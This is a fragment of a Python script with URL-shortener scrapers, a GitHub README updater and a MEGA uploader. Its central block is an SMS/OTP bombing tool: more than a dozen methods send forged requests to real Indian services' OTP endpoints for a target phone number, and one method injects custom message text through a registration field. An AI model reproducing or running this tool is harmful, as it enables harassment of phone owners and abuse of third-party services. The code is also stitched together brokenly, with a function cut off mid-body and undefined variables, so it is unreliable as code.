    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/README.md"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Get the current README content
    response = requests.get(base_url, headers=headers)
    response_json = response.json()
    current_readme_content = b64encode(response_json['content'].encode()).decode()
    
    # Update the content if it's different
    if current_readme_content != b64encode(new_readme_content.encode()).decode():
        payload = {
            "message": commit_message,
            "content": b64encode(new_readme_content.encode()).decode(),
            "sha": response_json['sha']
        }
        update_response = requests.put(base_url, headers=headers, json=payload)
        if update_response.status_code == 200:
            print('\n')
            FrontentTypingFunction("README updated successfully.")
        else:
            print(f"Failed to update README. Status Code: {update_response.status_code}")
            print(update_response.json())
            exit()
    else:
        print("No changes detected in README.")
        print('\n')
        backie()

def shorturllop(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)

    response = requests.post('https://cutt.ly/scripts/shortenUrl.php', cookies=cookies, headers=headers, data=data)

    content = response.content

    with open('last.txt','w') as oi:
        oi.write(str(content))

    with open('last.txt','r') as lj:
        data5 = lj.read()

    yy = data5.split("'")
    return yy[1]
    
    os.remove('last.txt')
    os.remove('samaybhai.txt')

def upload_multiple_to_mega(email, password, files):
    mega = Mega()
    m = mega.login(email, password)
    
    for file_path in files:
        m.upload(file_path)
        FrontentTypingFunction(f"Uploaded: {file_path}")

def mainsystemlink():
    money = Main_Setup()
    money.oneshotkill()
    with open('.mega.txt','r') as megaread:
        megareads = megaread.readlines()

    emptybhai = {}

    for i in megareads:
        jsplit = i.split('\t')
        emptybhai[jsplit[0]] = jsplit[1]

    emptybhai = { x.translate({32:None}) : y
        for x, y in emptybhai.items()}


    mega_email = f"{emptybhai.get('Username')}".strip()
    mega_password = f"{emptybhai.get('Password')}".strip()

    with open('.savenamed.txt','r') as files:
        oksdata = files.readlines()

    # Log in to MEGA
    mega = Mega()
    m = mega.login(mega_email, mega_password)
  

    op = 0
    samay = []

    for line in oksdata:
        samay.append(line.strip())

    filesdirnew = os.path.expanduser('~') + '/'

    newfilenames = []
    osp = 1
    for k in samay:
        Klops = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the Related name file {osp} : "+r).strip()
        newfilenames.append(Klops)
        osp = osp + 1


    money.oneshotkill()


    # Upload the file and get its handle

    for i in samay:
        file_handle = m.upload(samay[op])
        
        

        # Get the public download link
        download_link = m.get_upload_link(file_handle)

        with open(f'{filesdirnew}.bash_mega.txt','a') as filesnewcontent:
                
                filesnewcontent.write(f'{newfilenames[op]} 	 {download_link}\n')
        

        print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m link -> "+Fore.RED+f"{samay[op]}: "+Fore.GREEN+str(shorturllop(download_link)))

        op = op + 1
        
    
     
    os.remove('.savenamed.txt')
    print('\n')
    backie()
    


def shorturl(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)


'''

class Database:

    def WriteReq_Read(self,filename,request_variable):
        if not os.path.exists(os.path.expanduser('~') + '/.system/'):
            os.makedirs(os.path.expanduser('~')+'/.system')
        with open(os.path.expanduser('~')+f'/.system/{filename}.txt','w') as filereq:
            filereq.write(str(request_variable))

        with open(os.path.expanduser('~')+f'/.system/{filename}.txt','r') as filereq:
            self.data = filereq.read().strip()

        return self.data

        
    
    def Return_restart(self):
        os.system('python main.py' if os.name=='nt' else 'python3 main.py')
        sys.exit()



    def Bjp_saral(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json',
            'Origin': 'https://saral.bjp.org',
            'Connection': 'keep-alive',
            'Referer': 'https://saral.bjp.org/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
        }
        json_data = {
            'phone_number': self.NumberInput_bomb,
            'web_login': True,
        }
        try:
            response = requests.post('https://saralk.ccdms.in/zila/api/login', headers=headers, json=json_data)

        except Exception as samay:
            print(samay)



    def railmadad(self):

        self.autobypass = True
        self.dataaccess = Samay(self.autobypass)
        df = requests.get('https://railmadad.indianrailways.gov.in/madad/final/home.jsp').cookies
        self.output = self.dataaccess.WriteReq_Read('.railmadad',df)
        sessionid = self.output.strip().split()[1].split('=')[1]
        tsof1b = self.output.strip().split()[5].split('=')[1]
        madad = self.output.strip().split()[9].split('=')[1]
        d9c = self.output.strip().split()[13].split('=')[1]
        cookies = {
            'JSESSIONID': sessionid,
            'TS01580f1b': tsof1b,
            'MADAD': madad,
            'TS0190fd9c': d9c,
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'X-Requested-With': 'XMLHttpRequest, XMLHttpRequest',
            'MADADTOKEN': 'QUQ5-GL9V-JP7B-B4F5-QF8T-21MM-SDK7-QW9P',
            'Connection': 'keep-alive',
            'Referer': 'https://railmadad.indianrailways.gov.in/madad/final/home.jsp',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        params = {
            'mobile': self.NumberInput_bomb,
            'fetchdatatype': 'regcomplaintotpvalidate',
        }
        try:
            response = requests.get(
                'https://railmadad.indianrailways.gov.in/madad/FetchData',
                params=params,
                cookies=cookies,
                headers=headers,
            )

        except Exception as samay:
            print(samay)


    def adda(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json',
            'Referer': 'https://www.adda247.com/',
            'cp-origin': '11',
            'X-Auth-Token': 'fpoa43edty5',
            'Origin': 'https://www.adda247.com',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Connection': 'keep-alive',
        }
        params = {
            'src': 'aweb',
        }
        json_data = {
            'to': self.NumberInput_bomb,
            'messageType': 'ADDA',
        }
        try:
            response = requests.post('https://ebooks.adda247.com/api/v1/sms/send', params=params, headers=headers, json=json_data)
        except Exception as samay:
            print(samay)


    def striker(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json',
            'Origin': 'https://striker.club',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
        }
        json_data = {
            'mobileNo': self.NumberInput_bomb,
            'type': '',
        }
        try:
            response = requests.post('https://api.strikergame.com/appLink', headers=headers, json=json_data)
        except Exception as samay:
            print(samay)


    def tractor(self):
        self.autobypass = True
        self.dataaccess = Samay(self.autobypass)
        d_trac= requests.get('https://www.tractorjunction.com/login/').cookies
        self.tractor = self.dataaccess.WriteReq_Read('.tractor',d_trac)
        sessionid = self.tractor.split('=')[1].split()[0]
        second = self.tractor.split()[5].split('=')[1]
        cookies = {
            'XSRF-TOKEN': sessionid,
            'tractorjunction_session': second,
            '_ga_RME1VG8XJP': 'GS1.1.1697814621.1.0.1697814635.46.0.0',
            '_ga': 'GA1.2.1459764039.1697814621',
            '_gid': 'GA1.2.1481014848.1697814622',
            '_gat': '1',
            '_fbp': 'fb.1.1697814624636.1195250816',
            'TJ_Promotion_PopUp': 'false',
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'X-Requested-With': 'XMLHttpRequest',
            'Connection': 'keep-alive',
            'Referer': 'https://www.tractorjunction.com/login/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',

        }
        params = {
            'mobile': self.NumberInput_bomb,
        }
        try:
            response = requests.get('https://www.tractorjunction.com/ajax/send-otp/', params=params, cookies=cookies, headers=headers)
        except Exception as samay:
            print(samay)


    def byjus(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json',
            'Referer': 'https://byjus.com/',
            'Origin': 'https://byjus.com',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'Connection': 'keep-alive',
        }
        json_data = {
            'phone': f'+91-{self.NumberInput_bomb}',
            'app_client_id': '90391da1-ee49-4378-bd12-1924134e906e',
        }
        try:
            response = requests.post('https://identity.tllms.com/api/request_otp', headers=headers, json=json_data)
        except Exception as samay:
            print(samay)


    def Mycircle(self):
        self.autobypass = True
        self.dataaccess = Samay(self.autobypass)
        s = requests.get('https://www.my11circle.com').cookies
        self.hvv = self.dataaccess.WriteReq_Read('.mycircle',s)
        visitor = self.hvv.split('[')[1].split()[9].split('=')[1]
        ssid = self.hvv.split('[')[1].split()[13].split('=')[1]
        cookies = {
            'sameSiteNoneSupported': 'true',
            'device.info.cookie': '{"bv":"116.0","bn":"Firefox","osv":"x86_64","osn":"Linux","tbl":"false","vnd":"false","mdl":"false"}',
            'NA_VISITOR': visitor.strip(),
            'SSID': ssid.strip(),
            'ga24x7_pixeltracker': 'from_page%3Dlogin.html%26referrer_url%3Dhttps%253A%252F%252Fwww.google.com%252F',
            '_ga_CBCP2KTYZP': 'GS1.1.1697754404.1.1.1697754448.0.0.0',
            '_ga': 'GA1.2.124611278.1697754405',
            '_gid': 'GA1.2.1015228559.1697754405',
            '_gat_gtag_UA_3610156_25': '1',
            '_gat_UA-3610156-25': '1',
            'optiMonkClientId': '3ede0b90-d65f-e924-dc27-9c1b47e395b7',
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.my11circle.com/player/login.html',
            'Content-Type': 'application/json',
            'Origin': 'https://www.my11circle.com',
            'Alt-Used': 'www.my11circle.com',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        json_data = {
            'mobile': self.NumberInput_bomb,
            'deviceId': 'd910ec2a-e71d-40a5-aeca-59b804220b7a',
            'deviceName': '',
            'refCode': '',
            'isPlaycircle': False,
        }
        try:
            response = requests.post('https://www.my11circle.com/api/fl/auth/v3/getOtp', cookies=cookies, headers=headers, json=json_data)
        except Exception as samay:
            print(samay)



    def naturebasket(self):
        self.autobypass = True
        self.dataaccess = Samay(self.autobypass)
        sdh = requests.get('https://www.naturesbasket.co.in').cookies
        data = self.dataaccess.WriteReq_Read('.naturebasket',sdh)
        asp_net = data.split()[1].split('=')[1]
        recookie = data.split()[9].split('usersessionidrec=')[1]
        recommcookie = 'usersessionidrec='+recookie
        nbloc = data.split()[13].split('=')
        nblocfinal = nbloc[1] + '=' + nbloc[2] + '==' + nbloc[4] + '=' + nbloc[5] + '==' + nbloc[7] + '=' + nbloc[8] + '==' + nbloc[10] + '=' + nbloc[11] + '==' + nbloc[13] + '=' + nbloc[14] + '=='
        ofcartiui = data.split()[17].split('=offlineuid=')[1]
        finalofflineid = 'offlineuid='+ofcartiui
        cookies = {
            'ASP.NET_SessionId': asp_net,
            'mobileCookie': 'device=user',
            'RecommendationCookie': recommcookie,
            'nbloc': nblocfinal,
            'ofcartuid': finalofflineid,
            'absource': 'head',
            '_gcl_au': '1.1.1175984559.1697775198',
            '_ga_70NR8215G0': 'GS1.1.1697775199.1.0.1697775199.60.0.0',
            '_ga': 'GA1.3.1030214546.1697775199',
            '_gid': 'GA1.3.1872495653.1697775203',
            '_gat': '1',
            '_gat_UA-75932579-1': '1',
            '_fbp': 'fb.2.1697775204036.1180728597',
            'USER_DATA': '%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%22ffb61760-913f-49f3-868c-85fba10e6bff%22%2C%22deviceAdded%22%3Atrue%7D',
            'moe_uuid': 'ffb61760-913f-49f3-868c-85fba10e6bff',
            'SOFT_ASK_STATUS': '%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
            'HARD_ASK_STATUS': '%7B%22actualValue%22%3A%22dismissed%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
            'OPT_IN_SHOWN_TIME': '1697775235602',
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.naturesbasket.co.in/',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.naturesbasket.co.in',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Connection': 'keep-alive',
        
        }
        params = {
            'loginregistrationsendotp': self.NumberInput_bomb,
        }
        try:
            response = requests.post(
                'https://www.naturesbasket.co.in/Handlers/LoginRegistrationMaster.ashx',
                params=params,
                cookies=cookies,
                headers=headers,
            )
        except Exception as samay:
            print(samay)


    def Shadowapi(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'referrer': 'flash_web',
            'Content-Type': 'application/json',
            'Origin': 'https://delivery.shadowfax.in',
            'Connection': 'keep-alive',
            'Referer': 'https://delivery.shadowfax.in/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
        }
        json_data = {
            'mobile_number': self.NumberInput_bomb,
        }
        try:
            response = requests.post('https://api.shadowfax.in/delivery/otp/send/', headers=headers, json=json_data)
        except Exception as samay:
            print(samay)


    def aakash(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.aakash.ac.in/',
            'content-type': 'application/json',
            'x-client-id': 'a6fbf1d2-27c3-46e1-b149-0380e506b763',
            'Origin': 'https://www.aakash.ac.in',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
        }
        json_data = {
            'action': 'generate',
            'phone': self.NumberInput_bomb,
            'access': 'signup',
        }
        try:
            response = requests.post(
                'https://session-service.aakash.ac.in/prod/sess/api/v1/user/phone/otp/',
                headers=headers,
                json=json_data,
            )
        except Exception as samay:
            print(samay)


    def pospe(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://postpe.app/',
            'Content-type': 'application/json; charset=UTF-8',
            'clientId': 'postpe',
            'Origin': 'https://postpe.app',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
        }

        json_data = {
            'hashKey': '',
            'mobile': self.NumberInput_bomb,
            'serviceName': 'POSTPE_LEAD_GENERATION',
            'type': 'MOBILE',
        }
        try:
            response = requests.post('https://api-consumer.bharatpe.in/generic/customer/otp/generate', headers=headers, json=json_data)
        except Exception as samay:
            print(samay)


    def payrup(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json',
            'Authorization': 'null',
            'Origin': 'https://payrup.com',
            'Connection': 'keep-alive',
            'Referer': 'https://payrup.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
        }

        json_data = {
            'mobileNumber': self.NumberInput_bomb,
        }

        try:
            response = requests.post('https://api.payrup.com/api/auth/otp/generate', headers=headers, json=json_data)
        except Exception as samay:
            print(samay)

    def Rummyculture(self):
        cookies = {
            'utm_source': 'google',
            'utm_medium': 'cpc',
            'utm_campaign': 'Brand-CKW-Search-mhdlgj_DSK',
            'utm_term': 'AW_Search_RC_mhdlgj_Exact_CKW_Rummyculture_Online_DSK',
            '_gcl_aw': 'GCL.1697874407.CjwKCAjw7c2pBhAZEiwA88pOFxVO1qNMO8utsjn4WZ357Vlbjwl9qMVsnN-hwe9w1z0XZY8ePFSZABoCXoEQAvD_BwE',
            '_gcl_au': '1.1.509018550.1697874407',
            '_ga_6TQXHTPKNY': 'GS1.1.1697874409.1.0.1697874409.60.0.0',
            '_ga': 'GA1.2.1021183426.1697874410',
            '_ga_WC4M6L7CPF': 'GS1.1.1697874409.1.0.1697874409.60.0.0',
            '_fbp': 'fb.1.1697874410261.840870675',
            '_dcmn_p': 'kZtbY2lkPVFtaXdLMlV6Z2VzWVVmOWpBVU0',
            '_dcmn_p': 'kZtbY2lkPVFtaXdLMlV6Z2VzWVVmOWpBVU0',
            '_dcmn_p': 'kZtbY2lkPVFtaXdLMlV6Z2VzWVVmOWpBVU0',
            'gk-interaction-id': '2249e324-c048-4134-8487-3766ef9b78cd',
            '_gid': 'GA1.2.876098263.1697874413',
            '_gac_UA-105018979-1': '1.1697874413.CjwKCAjw7c2pBhAZEiwA88pOFxVO1qNMO8utsjn4WZ357Vlbjwl9qMVsnN-hwe9w1z0XZY8ePFSZABoCXoEQAvD_BwE',
            '_gat_UA-105018979-1': '1',
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json;charset=utf-8',
            'Origin': 'https://www.rummyculture.com',
            'Connection': 'keep-alive',
            'Referer': 'https://www.rummyculture.com/welcome-gamecash-p12/?autoDownload=true&utm_source=google&utm_medium=cpc&utm_campaign=Brand-CKW-Search-mhdlgj_DSK&utm_term=AW_Search_RC_mhdlgj_Exact_CKW_Rummyculture_Online_DSK&af_pmod_priority=equal&gad_source=1&gclid=CjwKCAjw7c2pBhAZEiwA88pOFxVO1qNMO8utsjn4WZ357Vlbjwl9qMVsnN-hwe9w1z0XZY8ePFSZABoCXoEQAvD_BwE',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }

        json_data = {
            'headers': {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            },
            'mobile': self.NumberInput_bomb,
        }


        try:
            response = requests.post(
                'https://www.rummyculture.com/api/user/sendAppDownloadLink',
                cookies=cookies,
                headers=headers,
                json=json_data,
            )
        except Exception as samay:
            print(samay)


    def rummycircle(self):
        self.ok = True
        self.manners = Samay(self.ok)
        sd = requests.get('https://www.rummycircle.com').cookies
        ds = self.manners.WriteReq_Read('.rummycircle',sd)
        awsalb = ds.split()[1].split('=')[1]
        awscors = ds.split()[5].split('=')[1]
        longvisitor = ds.split()[13].split('=')[1]
        ssid = ds.split()[21].split('=')[1]
        ssiduser = ds.split()[25].split('=')[1]
        jessionid = ds.split()[29].split('=')[1]
        cookies = {
            'AWSALB': awsalb,
            'AWSALBCORS': awscors,
            'sameSiteNoneSupported': 'true',
            'LONG_VISITOR': longvisitor,
            'device.info.cookie': '{"bv":"116.0","bn":"Firefox","osv":"x86_64","osn":"Linux","tbl":"false","vnd":"false","mdl":"false"}',
            'SSID': ssid,
            'SSIDuser': ssiduser,
            'ga24x7_jsessionid': f'{jessionid}',
            'ga24x7_pixeltracker': 'pid%3Dgadwords_af%26af_pmod_priority%3Dequal%26af_pmod_lookback_window%3D7d%26is_retargeting%3Dtrue%26utm_source%3Dgadwords%26utm_medium%3DSearch%26utm_content%3Dade1467%26utm_term%3De_rummycircle%26utm_campaign%3DSE-Top_10_Brand_DT_MH%26utm_placement%3Drummycircle_EM%26gclid%3DCjwKCAjw7c2pBhAZEiwA88pOF5R-MmCdmRZb2-JiYyOHLn8BMAT06ILFN3Ix3lQ7qLG7BGSbO2y1DxoCaRIQAvD_BwE%26from_page%3Dindex.html%26referrer_url%3Dhttps%253A%252F%252Fwww.google.com%252F',
            'NA_IDVISIT': '7d0b68e9-bef3-4465-b794-493db8aab9c1',
            'NA_VISITOR': '7d0b68e9-bef3-4465-b794-493db8aab9c1',
            '__utma': '3588915.606207300.1697885697.1697885697.1697885697.1',
            '__utmb': '3588915.2.9.1697885698411',
            '__utmc': '3588915',
            '__utmz': '3588915.1697885697.1.1.utmcsr=gadwords|utmgclid=CjwKCAjw7c2pBhAZEiwA88pOF5R-MmCdmRZb2-JiYyOHLn8BMAT06ILFN3Ix3lQ7qLG7BGSbO2y1DxoCaRIQAvD_BwE|utmccn=SE-Top_10_Brand_DT_MH|utmcmd=Search|utmctr=e_rummycircle|utmcct=ade1467',
            '_gac_UA-3610156-1': '1.1697885697.CjwKCAjw7c2pBhAZEiwA88pOF5R-MmCdmRZb2-JiYyOHLn8BMAT06ILFN3Ix3lQ7qLG7BGSbO2y1DxoCaRIQAvD_BwE',
            '__utmt_pageTracker': '1',
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.rummycircle.com/?pid=gadwords_af&af_pmod_priority=equal&af_pmod_lookback_window=7d&is_retargeting=true&utm_source=gadwords&utm_medium=Search&utm_content=ade1467&utm_term=e_rummycircle&utm_campaign=SE-Top_10_Brand_DT_MH&utm_placement=rummycircle_EM&gclid=CjwKCAjw7c2pBhAZEiwA88pOF5R-MmCdmRZb2-JiYyOHLn8BMAT06ILFN3Ix3lQ7qLG7BGSbO2y1DxoCaRIQAvD_BwE',
            'Content-Type': 'application/json',
            'Origin': 'https://www.rummycircle.com',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            
        }

        json_data = {
            'mobile': self.NumberInput_bomb,
            'deviceId': '1c18a2b4-7954-4e25-9270-c36cd090ddf2',
            'deviceName': '',
            'refCode': '',
            'isPlaycircle': False,
        }

        try:
            response = requests.post('https://www.rummycircle.com/api/fl/auth/v3/getOtp', cookies=cookies, headers=headers, json=json_data)
        except Exception as samay:
            print(samay)

    



    def returnbhai(self):
        fd = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Back or Exit [y/n] : "+r).strip()
        if fd =='y' or fd == 'Y':
            backslash()
            Type('Restarting the Script ......')
            time.sleep(1.2)
            os.system('python main.py' if os.name=='nt' else 'python3 main.py')
            sys.exit()


    def CustomSms(self):
        headers = {
            'Accept-Charset': 'UTF-8',
            'Content-Type': 'application/json; charset=UTF-8',
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; Redmi 6 Pro MIUI/V11.0.7.0.PDMMIXM)',
            'Host': 'prod.milkbasket.com',
            'Connection': 'Keep-Alive',
        }

        json_data = {
            'mobile': self.NumberInput_bomb,
            'appHash': f'\nmsg= {self.msg}', # 17 words
        }

        response = requests.post(
            'https://prod.milkbasket.com/milkbasket_prod_current/consumer/user/register_mobile',
            headers=headers,
            json=json_data,
        ).json()

        if response['status'] == True:
            return True
        else:
            return False
'''

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        return value
       
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')


def shorturlsnew(link):
    cookies = {
    '_ga': 'GA1.2.1841157735.1660546435',
    '_gid': 'GA1.2.1926940915.1660546435',
    '_gat_gtag_UA_31391210_44': '1',
    }

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        print('\n')
        FrontentTypingFunction('└─[ ✔ ] Success')
        FrontentTypingFunction(f"└─[ ✔ ] Link : "+Fore.GREEN+f"{value}")
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
